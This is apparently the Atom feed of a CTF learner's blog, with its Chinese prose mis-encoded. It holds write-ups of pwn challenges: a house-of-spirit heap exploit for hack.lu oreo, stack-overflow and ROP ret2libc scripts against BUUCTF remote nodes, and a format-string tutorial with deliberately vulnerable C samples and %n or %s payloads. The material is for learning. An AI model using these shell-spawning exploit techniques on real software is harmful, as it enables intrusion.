<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://zhangzy999.github.io/</id>
    <title>æŸ æª¬çš„åšå®¢</title>
    <updated>2020-07-11T14:42:24.216Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://zhangzy999.github.io/"/>
    <link rel="self" href="https://zhangzy999.github.io/atom.xml"/>
    <subtitle>æˆ‘æ˜¯ä¸€ä¸ªçƒ­çˆ±ä¿¡æ¯å®‰å…¨çš„æ™®é€šäººï¼Œä¸€ä½CTFå…¥é—¨è€…ï¼Œç¼–ç¨‹è¯­è¨€ä½¿ç”¨è€…ï¼Œä¸€ä½æå®¢è¿½é€è€…ã€‚</subtitle>
    <logo>https://zhangzy999.github.io/images/avatar.png</logo>
    <icon>https://zhangzy999.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, æŸ æª¬çš„åšå®¢</rights>
    <entry>
        <title type="html"><![CDATA[fastbin attack(house of sprit) - 2014 hack.lu oreo]]></title>
        <id>https://zhangzy999.github.io/post/fastbin-attackhouse-of-sprit-2014-hacklu-oreo/</id>
        <link href="https://zhangzy999.github.io/post/fastbin-attackhouse-of-sprit-2014-hacklu-oreo/">
        </link>
        <updated>2020-07-11T14:17:26.000Z</updated>
        <content type="html"><![CDATA[<p>é¢˜ç›®æ˜¯è¿™æ ·shaiçš„<br>
<img src="https://zhangzy999.github.io//post-images/1594477169098.png" alt="" loading="lazy"><br>
å¤§æ¦‚æ˜¯ä¸ªæªæ”¯å•†åº—ï¼Œå¯ä»¥æ·»åŠ æªæ”¯ï¼Œé‡Šæ”¾æªæ”¯ï¼Œå±•ç¤ºæªæ”¯ä¿¡æ¯ï¼Œç•™è¨€ç­‰ç­‰<br>
ç„¶åè¿™ä¸ªä¾‹é¢˜éš¾åº¦ä¸»è¦æ˜¯åœ¨é€†å‘åˆ†æä¸Šï¼Œå¾ˆä»¤äººæ¼ç«ï¼ˆ<br>
ç„¶åè¯´ä¸€ä¸‹house of spritæ”»å‡»æ‰‹æ³•<br>
ä¸»è¦æ˜¯æœ‰ä¸€ä¸ªç›®æ ‡åŒºåŸŸæˆ‘ä»¬æ²¡åŠæ³•æ§åˆ¶ï¼Œä½†æ˜¯è¿™ä¸ªåŒºåŸŸä¹‹å‰å’Œä¹‹åçš„åŒºåŸŸæˆ‘ä»¬å¯ä»¥æ§åˆ¶ï¼Œæˆ‘ä»¬æ§åˆ¶åŒºåŸŸä¹‹å‰ä¸»è¦æ˜¯ä¸ºäº†æ¥ä¼ªé€ chunkçš„sizeï¼Œè®©å…¶ç»•è¿‡æ£€æŸ¥æœºåˆ¶ï¼Œæ§åˆ¶ç›®æ ‡åŒºåŸŸä¹‹åçš„ä½ç½®ä¸»è¦æ˜¯ä¼ªé€ the next chunkçš„sizeï¼Œnext chunk çš„å¤§å°ä¸èƒ½å°äº 2 * SIZE_SZï¼ˆä¸¤ä¸ªå­—é•¿ï¼‰ï¼ŒåŒæ—¶ä¹Ÿä¸èƒ½å¤§äºav-&gt;system_memï¼Œç„¶åè¿˜æœ‰ç±»ä¼¼ä¸é‚£ç§æ£€æŸ¥sizeä½çš„ISMMAPä½ç­‰å®¹æ˜“æ»¡è¶³çš„æ£€æŸ¥ï¼Œæˆ‘ç›´æ¥æ”¾ä¸ªwikiä¸Šçš„å›¾ï¼Œæ–¹ä¾¿ä»¥åå¤ä¹ ç”¨ã€‚<br>
<img src="https://zhangzy999.github.io//post-images/1594477558899.png" alt="" loading="lazy"><br>
æˆ‘æ˜¯æ‡’ç‹—ï¼Œä¸æˆªå›¾äº†ï¼Œç›´æ¥å¤§è‡´è¯´è¯´æ•´ä½“çš„æ€è·¯å¥½äº†<br>
addåŠŸèƒ½ï¼š<br>
æ·»åŠ æªæ”¯ç»“æ„ä½“ï¼Œæˆ‘ä»¬å¯ä»¥è¾“å…¥åå­—å’Œæè¿°ï¼Œåœ¨åå­—çš„ä½ç½®çš„åœ°æ–¹å¯ä»¥è¿›è¡Œå †æº¢å‡ºï¼Œè¦†ç›–æœ€åä¸€ä¸ªå­—é•¿ï¼Œæœ€åä¸€ä¸ªå­—é•¿å­˜å‚¨ä¸Šä¸€ä¸ªchunkçš„åœ°å€ã€‚<br>
showåŠŸèƒ½ï¼š<br>
æœ¬é¢˜ç›®æ²¡æœ‰åé—¨ï¼Œæˆ‘ä»¬åªèƒ½æ³„éœ²libcåŸºå€æ¥æ‹¿åˆ°systemåœ°å€ï¼Œæˆ‘ä»¬é€‰æ‹©freeå‡½æ•°æ¥æ³„éœ²å³å¯ï¼Œç”±äºå»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œæˆ‘ä»¬æå‰ç”³è¯·å’Œé‡Šæ”¾ä¸€ä¸ªå †å—æ¥å¤„ç†ã€‚é€šè¿‡showçš„æ‰“å°åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯å¾—åˆ°free@gotï¼Œè¿›è€Œå¾—åˆ°systemåœ°å€ã€‚<br>
freeåŠŸèƒ½ï¼š<br>
ä»æœ€åä¸€ä¸ªå †å—å¼€å§‹ï¼Œä¾æ¬¡å‘å‰freeæ‰€æœ‰å †å—ã€‚è¿™é‡Œçš„è¯æˆ‘ä»¬ä¼ªé€ çš„chunkä¸åœ¨é“¾è¡¨çš„æœ€åéƒ¨ä½ï¼Œå³ç¨‹åºæ— æ³•æ£€æµ‹åˆ°double freeï¼Œå¯ä»¥æ”¾å¿ƒçš„van~<br>
messageåŠŸèƒ½ï¼š<br>
å¯ä»¥å†™å…¥ç•™è¨€ä¿¡æ¯ï¼ŒmessageæŒ‡é’ˆä½äºbssæ®µï¼ŒåŒæ—¶æŒ‡å‘bssæ®µæŸä¸ªä½ç½®ï¼Œæˆ‘ä»¬å¯ä»¥å†™å…¥ç•™è¨€ï¼Œç„¶åç«‹å³è°ƒç”¨strlenå‡½æ•°è¿›è¡Œä¸€äº›æ£€æŸ¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è€ƒè™‘åœ¨messageæŒ‡é’ˆè¿™ä¸ªéƒ¨ä½ä¼ªé€ ä¸€ä¸ªchunkï¼Œä¿®æ”¹messageæŒ‡é’ˆåˆ°strlenå‡½æ•°çš„åœ°å€ï¼Œç„¶åæˆ‘ä»¬å†™å…¥systemçš„åœ°å€ï¼Œè¿™æ ·å‡½æ•°å°±ç»™æˆ‘ä»¬è°ƒç”¨systemäº†ã€‚<br>
ç»¼ä¸Šæ‰€è¿°ï¼Œæ³„éœ²systemåœ°å€ï¼Œç„¶ååˆ©ç”¨heap overflowä¼ªé€ ä¸€ä¸ªbss_chunkï¼Œç„¶åæˆ‘ä»¬freeã€‚ï¼ˆå€¼å¾—ä¸€æçš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨è¿™ä¹‹å‰ï¼Œbss_chunk_dataæŒ‡é’ˆ-0x4çš„ä½ç½®åº”è¯¥æ˜¯ä¼ªé€ çš„chunkçš„sizeåŸŸï¼Œè€Œè¿™ä¸ªåœ°æ–¹æ°å¥½æ˜¯è®°å½•äº†æˆ‘ä»¬addäº†å¤šå°‘æ¬¡chunkçš„å˜é‡ï¼Œæ‰€ä»¥åœ¨expé‡Œæˆ‘ä»¬ç”¨äº†ä¸€ä¸ªforå¾ªç¯æ¥ç”³è¯·chunkï¼Œä½¿å…¶å˜ä¸º0x40ï¼Œæ¥ä¼ªé€ å…¶sizeã€‚ä¹‹åæˆ‘ä»¬å¯ä»¥ç”¨messageåŠŸèƒ½ï¼Œç¼–è¾‘ä¿¡æ¯ï¼Œä¼ªé€ next chunkçš„sizeã€‚ï¼‰freeä¹‹åæˆ‘ä»¬mallocï¼Œå°±å¾—åˆ°äº†ä¸€ä¸ªå¯æ§æŒ‡é’ˆï¼Œæˆ‘ä»¬åŠ«æŒstrlenå‡½æ•°æ”¹ä¸ºsystemï¼Œä¼ å…¥å‚æ•°&quot;;/bin/sh\x00&quot;ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œsystem(&quot;ls;/bin/sh&quot;)ç›¸å½“äºåˆ†åˆ«ä¼ å…¥å‚æ•°lså’Œbinshï¼Œå¤§æ¦‚å°±æ˜¯è¿™ä¸ªåŸç†ï¼Œç›´æ¥å†™exp</p>
<pre><code class="language-python">from pwn import *

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
libc = ELF('./libc.so.6')
p = process('./oreo')
elf = ELF('./oreo')
#context.log_level = 'debug' 

def add(name,description):
	#p.recvuntil('Action: ')
	p.sendline('1')
	#p.recvuntil('Rifle name: ')
	p.sendline(name)
	#p.recvuntil('Rifle description: ')
	#pause()
	p.sendline(description)

def show():
	#p.recvuntil('Action: ')
	p.sendline('2')

def free():
	#p.recvuntil('Action: ')
	p.sendline('3')

def edit_message(message):
	#p.recvuntil('Action: ')
	p.sendline('4')
	#p.recvuntil('Enter any notice you\'d like to submit with your order: ')
	p.sendline(message)

def show_current():
	#p.recvuntil('Action: ')
	p.sendline('5')

print &quot;====================================&quot;
print 'step1: leak libc'

add('a','b')
free() 
name = 'A' * 27 + p32(elf.got['free'])
#print 'name:' + name
description = 'A' * 25
add(name,description)

show()

p.recvuntil(25*'A')
p.recvuntil('Description: ')
free_addr = u32(p.recvuntil('\n',drop = True)[0:4])
print 'free_address: ' + hex(free_addr)
libc_base = free_addr - libc.symbols['free']
system_addr = libc_base + libc.symbols['system']
print 'system_addr: ' + hex(system_addr)

print &quot;====================================&quot;
print 'step2: alloc to bss'

# add 0x40 to change the newtimes which replace the size to bypass check
for i in range(0x40 - 0x2 - 0x1):
	add('a'*27 + p32(0),'b')

message_pointer = 0x0804a2a8  # fake chunk
payload = 27*'A' + p32(message_pointer)
add(payload,'a')

payload = (0x38 - (0x0804a2c0 - 0x0804a2a8) - 0x4) * 'A' + 0x4 * '\x00' + 'aaaa' + p32(0x100)         # in order to bypass the next chunk size check
edit_message(payload)
free()

print &quot;======================================&quot;
print 'step3: attack func &quot;strlen&quot; to get shell'

payload = p32(elf.got['strlen'])
add('hack',payload)
edit_message(p32(system_addr) + ';/bin/sh\x00')

p.interactive()
</code></pre>
<p>æ‹¿shellï¼Œå¾ˆå¥ˆæ–¯<br>
æˆ‘å¤ªèœäº†</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[buuctfï¼špwnåˆ·é¢˜è®°å½•ï¼ˆä¸€ï¼‰]]></title>
        <id>https://zhangzy999.github.io/post/buu_pwn_1/</id>
        <link href="https://zhangzy999.github.io/post/buu_pwn_1/">
        </link>
        <updated>2020-06-14T03:31:34.000Z</updated>
        <content type="html"><![CDATA[<h2 id="test_your_nc">test_your_nc</h2>
<p>è¿æ¥ä¸€ä¸‹æ‹¿flag</p>
<h2 id="rip">rip</h2>
<p>ç®€å•è¿è¡Œä¸€ä¸‹çœ‹çœ‹ç¨‹åºçš„æ•ˆæœ<br>
<img src="https://zhangzy999.github.io//post-images/1592108548694.png" alt="" loading="lazy"><br>
idaåˆ†æä¸€ä¸‹æ˜¯æ ˆæº¢å‡ºï¼Œæˆ‘ä»¬ç¡®å®šåç§»é‡<br>
<img src="https://zhangzy999.github.io//post-images/1592108567481.png" alt="" loading="lazy"><br>
ç„¶åæ‰¾åˆ°systemåœ°å€<br>
<img src="https://zhangzy999.github.io//post-images/1592108579697.png" alt="" loading="lazy"><br>
å†™exp</p>
<pre><code class="language-python">#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Author:CyurL3

from pwn import *

ip = 'node3.buuoj.cn'
port = '26614'
r = remote(ip,port)

offset = 0xF + 0x8
system_addr = 0x40118A

payload = offset * 'A' + p64(system_addr)

r.sendline(payload)
r.interactive()
</code></pre>
<h2 id="warmup_csaw_2016">warmup_csaw_2016</h2>
<p>çœ‹çœ‹ç¨‹åºåŠŸèƒ½<br>
<img src="https://zhangzy999.github.io//post-images/1592108601054.png" alt="" loading="lazy"><br>
æ£€æŸ¥ä¸€ä¸‹ç¨‹åºä¿æŠ¤æœºåˆ¶å‘ç°å•¥ä¹Ÿæ²¡å¼€ï¼Œç›´æ¥idaç¡®å®šåç§»é‡<br>
<img src="https://zhangzy999.github.io//post-images/1592108629784.png" alt="" loading="lazy"><br>
å‘ç°systemåœ°å€<br>
<img src="https://zhangzy999.github.io//post-images/1592108638603.png" alt="" loading="lazy"><br>
å†™exp</p>
<pre><code class="language-python">#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Author:CyurL3

from pwn import *

#filename = ''
#procedure = './' + filename
#sh = process(procedure)
#elf = ELF(procedure)

ip = 'node3.buuoj.cn'
port = '25606'
r = remote(ip,port)

offset = 0x40 + 0x8

r.recvuntil(':')
cat_flag_addr = r.recvuntil('\n',drop = True)
cat_flag_addr = int(cat_flag_addr,16)

payload = offset * 'A' + p64(cat_flag_addr)

r.recvuntil('&gt;')
r.sendline(payload)
r.interactive()
</code></pre>
<h2 id="pwn1_sctf_2016">pwn1_sctf_2016</h2>
<p>è¿è¡Œç¨‹åº<br>
<img src="https://zhangzy999.github.io//post-images/1592108657865.png" alt="" loading="lazy"><br>
ç„¶åæˆ‘ä»¬idaåˆ†æä¸€ä¸‹ï¼Œå¯ä»¥å‘ç°æ˜¯c++å†™çš„ï¼ˆæ¯äº†ï¼‰<br>
ç„¶åæœ‰ä¸ªå¾ˆå¥‡æ€ªçš„ç‚¹ï¼Œå¯ä»¥å‘ç°æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸è¶³ä»¥é€ æˆæ ˆæº¢å‡º<br>
<img src="https://zhangzy999.github.io//post-images/1592108665845.png" alt="" loading="lazy"><br>
ä¸è¿‡ä¸‹æ–‡å¥½åƒæ˜¯æœ‰é‚£ä¹ˆä¸€ä¸ªæŠŠ&quot;I&quot;æ›¿æ¢æˆ&quot;you&quot;çš„åŠŸèƒ½<br>
<img src="https://zhangzy999.github.io//post-images/1592108673171.png" alt="" loading="lazy"><br>
æˆ‘ä»¬è¿è¡Œä¸€ä¸‹ç¨‹åº<br>
<img src="https://zhangzy999.github.io//post-images/1592108681386.png" alt="" loading="lazy"><br>
è¿™æ ·çš„è¯èƒ½æŠŠä¸€ä¸ªå­—ç¬¦å˜æˆä¸‰ä¸ªå­—ç¬¦å°±èƒ½å¤Ÿè¿›è¡Œæº¢å‡ºäº†<br>
æˆ‘ä»¬æ‰¾systemåœ°å€<br>
<img src="https://zhangzy999.github.io//post-images/1592108688950.png" alt="" loading="lazy"><br>
ç¼–å†™exp</p>
<pre><code class="language-python">#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Author:CyurL3

from pwn import *

ip = 'node3.buuoj.cn'
port = '29955'
r = remote(ip,port)

offset = 0xC + 0x4 
get_flag_addr = 0x08048F0D

payload = 20 * 'I' + p32(get_flag_addr) + p32(get_flag_addr)

r.sendline(payload)
r.interactive()
</code></pre>
<h2 id="ciscn_2019_n_1">ciscn_2019_n_1</h2>
<p>è¿è¡Œç¨‹åº<br>
<img src="https://zhangzy999.github.io//post-images/1592108709887.png" alt="" loading="lazy"><br>
è¿›idaçœ‹çœ‹<br>
<img src="https://zhangzy999.github.io//post-images/1592108719223.png" alt="" loading="lazy"><br>
åº”è¯¥æ˜¯è®©æˆ‘ä»¬æº¢å‡ºv2çš„å€¼ï¼Œè®©v2ç­‰äº11.28125å°±èƒ½cat flag<br>
é‚£ä¹ˆé—®é¢˜å°±æ˜¯11.28125åœ¨å†…å­˜æ˜¯å¦‚ä½•è¡¨ç¤ºçš„ï¼Ÿ<br>
æœ‰ä¸€å¼ å›¾å‚è€ƒä¸€ä¸‹ï¼Œä¸æ˜¯æœ¬é¢˜é‡ç‚¹ï¼Œå¯è‡ªè¡ŒæŸ¥é˜…ä¸€ä¸‹æµ®ç‚¹æ•°åœ¨å†…å­˜ä¸­çš„è¡¨ç¤ºæ–¹æ³•<br>
<img src="https://zhangzy999.github.io//post-images/1592108725874.png" alt="" loading="lazy"><br>
æœ€ç»ˆè®¡ç®—ä¸€ä¸‹å°±æ˜¯0x41348000<br>
ç¼–å†™exp</p>
<pre><code class="language-python">#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Author:CyurL3

from pwn import *

ip = 'node3.buuoj.cn'
port = '26369'
r = remote(ip,port)

offset = 0x2C

payload = offset * 'A' + p64(0x41348000)

r.sendline(payload)
r.interactive()
</code></pre>
<h2 id="ciscn_2019_c_1">ciscn_2019_c_1</h2>
<p>è¿™ä¸ªé¢˜æ¯”ä¸Šé¢å››ä¸ªåŠ èµ·æ¥è¿˜éš¾=.=<br>
æˆ‘ä»¬è¿è¡Œä¸€ä¸‹ç¨‹åºï¼Œå‘ç°æœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼Œç¬¬ä¸€ä¸ªåŠŸèƒ½å°±æ˜¯ä¸€ä¸ªåŠ å¯†çš„åŠŸèƒ½ï¼Œç¬¬äºŒä¸ªåŠŸèƒ½æ²¡ç”¨ï¼Œç¨‹åºè®©æˆ‘ä»¬è‡ªå·±è§£å¯†ã€‚ã€‚ã€‚ç¬¬ä¸‰ä¸ªåŠŸèƒ½ç¨‹åºç›´æ¥é€€å‡ºäº†<br>
<img src="https://zhangzy999.github.io//post-images/1592108737030.png" alt="" loading="lazy"><br>
idaå‘ç°åŠ å¯†å‡½æ•°æ˜¯è¿™æ ·çš„<br>
<img src="https://zhangzy999.github.io//post-images/1592108744461.png" alt="" loading="lazy"><br>
ç„¶åputså‡½æ•°ä¼šè¾“å‡ºåŠ å¯†åçš„ä¿¡æ¯<br>
è¿™ä¸ªé¢˜æ²¡æœ‰åé—¨ä¹‹ç±»çš„å‡½æ•°ï¼Œéœ€è¦æˆ‘ä»¬æ„é€ ROPé“¾ï¼Œé‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆè¦æ‹¿åˆ°systemå‡½æ•°æˆ–è€…execveè¿™æ ·çš„å‡½æ•°çš„åœ°å€ï¼Œç”¨LibcSearcheræ¥æ<br>
å†æ¬¡ä¹‹å‰æˆ‘ä»¬å…ˆè¦è·å–putså‡½æ•°çš„åœ°å€ï¼Œç”±äºputså‡½æ•°åªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯rdiå¯„å­˜å™¨é‡Œçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥æ‰¾ä¸€ä¸‹pop rdi;retè¿™æ ·çš„ç‰‡æ®µï¼Œå‘ç°æ˜¯æœ‰è¿™ç§ç‰‡æ®µçš„<br>
<img src="https://zhangzy999.github.io//post-images/1592108751782.png" alt="" loading="lazy"><br>
ç„¶è€Œè¿™ä¸ªç‰‡æ®µå®é™…ä¸Šæ˜¯__libc_csu_initå‡½æ•°ï¼ˆä¸€ä¸ªåˆå§‹åŒ–libcçš„å‡½æ•°ï¼‰çš„ç‰‡æ®µï¼Œpop r15æŒ‡ä»¤æ˜¯ä¸‰ä¸ª16è¿›åˆ¶æ•°ï¼Œç„¶è€Œåä¸¤ä¸ªåå…­è¿›åˆ¶æ•°ç»„åˆæ­£å¥½æ˜¯pop rdiï¼Œä¹Ÿå°±æ˜¯èƒ½ç”¨ROPgadgetæœåˆ°çš„é‚£ä¸ªç‰‡æ®µï¼Œç”±äºæˆ‘ä»¬åªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œç›´æ¥ç”¨é‚£ä¸ªç‰‡æ®µæ¥ç©å°±è¡Œï¼Œä¸å†å±•å¼€ç”¨__libc_csu_initå‡½æ•°æ¥æ„é€ ROPé“¾äº†ï¼ˆwikiä¸Šæœ‰è¯¦ç»†è¯´æ˜ï¼‰<br>
<img src="https://zhangzy999.github.io//post-images/1592108761239.png" alt="" loading="lazy"><br>
æ³¨æ„æˆ‘ä»¬çš„payloadä¼šè¢«åŠ å¯†ï¼Œä¸¤æ¬¡å¼‚æˆ–åŠ å¯†åè¿˜æ˜¯å…¶æœ¬èº«ï¼Œæ‰€ä»¥æˆ‘ä»¬è‡ªå·±æ¥å†™ä¸ªè§£å¯†å‡½æ•°å¥½äº†ï¼Œç”±äºä¸¤æ¬¡payloadçš„é•¿åº¦ä¸€æ ·ï¼Œæ‰€ä»¥ç¬¬äºŒæ¬¡å‘payloadå°±ä¸ä¼šå†è¢«åŠ å¯†äº†ï¼ˆç”¨idaåˆ†æå¯çŸ¥ï¼‰<br>
ç›´æ¥è´´ä¸ªexpå§ï¼Œæ³¨æ„ï¼Œç¬¬äºŒæ¬¡çš„payloadæœ‰ä¸€ä¸ªæ ˆå¯¹é½ï¼Œæ‰€ä»¥æˆ‘ä»¬åŠ ä¸Šä¸€ä¸ªretæŒ‡ä»¤æ¥è¿›è¡Œå¯¹é½å³å¯</p>
<pre><code class="language-python">#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Author:CyurL3

from pwn import *
from LibcSearcher import LibcSearcher

ip = 'node3.buuoj.cn'
port = '27912'
r = remote(ip,port)
#sh = process('./ciscn_2019_c_1')
elf = ELF('./ciscn_2019_c_1')

offset = 0x58
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
gets_got = elf.got['gets']
main_addr = elf.symbols['main']
fregment_one = 0x400c7a
fregment_two = 0x400c60
pop_rdi_ret = 0x400c83
bss_base = elf.bss()

def encrypt(payload):
    l = list(payload)
    for i in range(len(l)):
        if l[i].isdigit():
            l[i] = chr(ord(l[i]) ^ 0xF)
        elif l[i].isupper():
            l[i] = chr(ord(l[i]) ^ 0xE)
        elif l[i].islower():
            l[i] = chr(ord(l[i]) ^ 0xD)
    return ''.join(l)

r.recvuntil('Input your choice!\n')
r.sendline('1')
r.recvuntil('Input your Plaintext to be encrypted\n')

payload = offset * 'A' + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) +p64(main_addr)
payload = encrypt(payload)
r.sendline(payload)

r.recvuntil('Ciphertext\n')
r.recvuntil('\n')
puts_addr = u64(r.recvuntil('\n', drop=True).ljust(8,'\x00'))
print 'puts_addr:' + hex(puts_addr)

libc = LibcSearcher('puts',puts_addr)
libcbase = puts_addr - libc.dump('puts')
system_addr = libcbase + libc.dump('system')
bin_sh_addr = libcbase + libc.dump('str_bin_sh')
print 'system:' + hex(system_addr)

r.recvuntil('Input your choice!\n')
r.sendline('1')
r.recvuntil('Input your Plaintext to be encrypted\n')

ret_addr = 0x4006b9
payload = offset * 'A' + p64(ret_addr)  + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) 
#payload = encrypt(payload)
r.sendline(payload)
r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å­¦ä¹ æ€»ç»“]]></title>
        <id>https://zhangzy999.github.io/post/format_string_study/</id>
        <link href="https://zhangzy999.github.io/post/format_string_study/">
        </link>
        <updated>2020-06-06T09:16:23.000Z</updated>
        <content type="html"><![CDATA[<p>ä»ctfwikiä¸Šå­¦ä¹ äº†ä¸€æ³¢ï¼Œæ¥æ€»ç»“ä¸€ä¸‹ï¼ˆæ¨èçœ‹ctfwikiï¼Œå¾ˆè¯¦ç»†ï¼Œä½†æ˜¯çœ‹å®Œé€‚åˆè‡ªå·±æ€»ç»“ï¼Œç¬¬äºŒéçœ‹çš„æ—¶å€™å°±æœ‰äº›å†—ä½™äº†ï¼‰<br>
åˆå­¦æ ¼å¼åŒ–å­—ç¬¦ä¸²å»ºè®®çœ‹wikiï¼Œæœ¬æ–‡æ˜¯æ€»ç»“ç¯‡</p>
<h1 id="æ³„éœ²å†…å­˜">æ³„éœ²å†…å­˜</h1>
<h2 id="æ³„éœ²æ ˆå†…å­˜">æ³„éœ²æ ˆå†…å­˜</h2>
<p>å…³äºæ ˆå†…å­˜çš„æ³„éœ²æ¯”è¾ƒç®€å•ï¼Œä¸å¤šè¯´äº†</p>
<h3 id="è·å–æ ˆå˜é‡çš„æ•°å€¼">è·å–æ ˆå˜é‡çš„æ•°å€¼</h3>
<h3 id="è·å–æ ˆå˜é‡çš„å­—ç¬¦ä¸²">è·å–æ ˆå˜é‡çš„å­—ç¬¦ä¸²</h3>
<h2 id="æ³„éœ²ä»»æ„åœ°å€å†…å­˜">æ³„éœ²ä»»æ„åœ°å€å†…å­˜</h2>
<p>çœ‹å®ä¾‹ç¨‹åº</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
int main() {
  char s[100];
  int a = 1, b = 0x22222222, c = -1;
  scanf(&quot;%s&quot;, s);
  printf(&quot;%08x.%08x.%08x.%s\n&quot;, a, b, c, s);
  printf(s);     //è¿™ä¸ªåœ°æ–¹æ˜¾ç„¶æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´
  return 0;
}
</code></pre>
<p>ç¼–è¯‘ä¸€ä¸‹</p>
<pre><code>gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c
</code></pre>
<p>æ³„éœ²æŒ‡å®šåœ°å€çš„æ–¹æ³•ï¼š</p>
<pre><code>addr%k$s
</code></pre>
<p>ç¡®å®šå­—ç¬¦ä¸²ä¸ºå‡ ä¸ªå‚æ•°çš„æ–¹æ³•ï¼š</p>
<pre><code>AAAA%p%p%p%p%p%p%p%p%p%p%p%p
</code></pre>
<p>æˆ‘ä»¬è®¾ç½®ä¸€ä¸ªå¯è®¿é—®çš„åœ°å€ï¼Œç”¨scanf@gotæ¥ä¸¾ä¾‹å­æ‹¿åˆ°scanfçš„åœ°å€ï¼ˆä¸€èˆ¬ä¸æ³„éœ²printfå‡½æ•°çš„åœ°å€ï¼Œè‡ªå·±å®æ“ä¸€ä¸‹å³å¯ï¼‰<br>
ç¬¬ä¸€æ­¥ï¼Œæ‹¿åˆ°scanf@gotçš„åœ°å€ï¼ˆå¯æœ‰å¯æ— ï¼‰<br>
<img src="https://zhangzy999.github.io//post-images/1591436467954.png" alt="" loading="lazy"><br>
ç¬¬äºŒæ­¥ï¼Œåˆ¤æ–­æ˜¯<strong>æ ¼å¼åŒ–å­—ç¬¦ä¸²</strong>çš„ç¬¬å‡ ä¸ªå‚æ•°<br>
é€šè¿‡%pçš„é‚£ç§å½¢å¼å¯ä»¥åˆ¤æ–­å‡ºæ¥æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬å››ä¸ªå‚æ•°<br>
<img src="https://zhangzy999.github.io//post-images/1591436474937.png" alt="" loading="lazy"><br>
ç¬¬ä¸‰æ­¥ï¼Œå†™payload</p>
<pre><code class="language-python">from pwn import *

filename = './format_string_1_leakmemory'
sh = process(filename)
elf = ELF(filename)

scanf_got = elf.got['__libc_start_main']
payload = p32(scanf_got) + '%4$s'

sh.sendline(payload)

sh.recvuntil('%4$s')
print hex(u32(sh.recv()[4:8]))
</code></pre>
<p>ç„¶åå°±æ‹¿åˆ°äº†scanfçš„åœ°å€</p>
<h1 id="è¦†ç›–å†…å­˜">è¦†ç›–å†…å­˜</h1>
<h2 id="è¦†ç›–æ ˆå†…å­˜">è¦†ç›–æ ˆå†…å­˜</h2>
<p>å®ä¾‹ç¨‹åºï¼š</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
int a = 123, b = 456;
int main() {
  int c = 789;
  char s[100];
  printf(&quot;%p\n&quot;, &amp;c);
  scanf(&quot;%s&quot;, s);
  printf(s);
  if (c == 16) {
    puts(&quot;modified c.&quot;);
  } else if (a == 2) {
    puts(&quot;modified a for a small number.&quot;);
  } else if (b == 0x12345678) {
    puts(&quot;modified b for a big number!&quot;);
  }
  return 0;
}
</code></pre>
<p>åŒæ ·å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ¼æ´ï¼Œæˆ‘ä»¬åœ¨è¿™ä¸€å°èŠ‚æ¥è¦†ç›–cçš„å€¼ï¼Œè®©ä»–ç­‰äº16<br>
è¿˜æ˜¯ä¸¤æ­¥èµ°ï¼š<br>
ç¬¬ä¸€æ­¥ï¼šç¡®å®šcçš„åœ°å€ï¼ˆåœ¨ç¨‹åºä¸­çš„ç¬¬å…­è¡Œå·²ç»æ‰“å°å‡ºæ¥cçš„åœ°å€ï¼‰<br>
ç¬¬äºŒæ­¥ï¼šç¡®å®šæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‚æ•°ï¼ˆä¸å†èµ˜è¿°ï¼Œè¿˜æ˜¯gdbä¸­ä¸‹æ–­ç‚¹æˆ–è€…ç›´æ¥è¿è¡Œç¨‹åºæ•°0xçš„ä¸ªæ•°ï¼Œaaaa%på¤§æ³•ï¼‰<br>
ç¡®å®šäº†è¿™ä¸¤æ­¥å°±èƒ½æŠŠpayloadå†™å‡ºæ¥äº†<br>
payloadï¼šp32([c_addr]) + (16-4) * 'A' + '%k$n'</p>
<h2 id="è¦†ç›–ä»»æ„åœ°å€å†…å­˜">è¦†ç›–ä»»æ„åœ°å€å†…å­˜</h2>
<h3 id="è¦†ç›–å°å€¼">è¦†ç›–å°å€¼</h3>
<p>æˆ‘ä»¬è¦†ç›–å˜é‡a<br>
è¿˜æ˜¯ä¸¤æ­¥èµ°ï¼š<br>
ç¬¬ä¸€æ­¥ï¼šç¡®å®šaçš„åœ°å€ï¼Œç›´æ¥ida<br>
ç¬¬äºŒéƒ¨ï¼šç¡®å®šæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‚æ•°<br>
